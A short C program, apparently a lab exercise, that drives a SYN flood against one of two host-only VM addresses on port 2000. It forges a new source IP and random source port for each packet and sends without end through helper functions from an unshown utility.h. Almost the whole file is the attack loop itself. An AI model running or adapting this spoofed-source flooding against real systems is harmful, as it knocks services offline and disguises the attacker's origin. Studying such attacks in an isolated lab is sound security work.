#include<stdio.h>
#include<stdlib.h>
#include<time.h>
#include<string.h>
#include "utility.h"

int main(){
    char original_ip[32] = "129.204.201.50";
    char newip[32];

    puts("Please choose the VM (1 or 2) to test :");
    int i;
    while(1){
        scanf("%d", &i);
        if(i!=1 && i!=2) puts("Invalid choice. Only 1 and 2 available.");
        else break;
    }

    char *dest_ip;
    if(i==1) dest_ip = "192.168.56.101";
    else dest_ip = "192.168.56.102";
    int dest_port = 2000;
        
    srand(time(NULL));

    while(1){
        rangeIP(original_ip, newip);
        int source_port = rand()%8000 + 2000;

        syn(newip, source_port, dest_ip, dest_port);
    }
}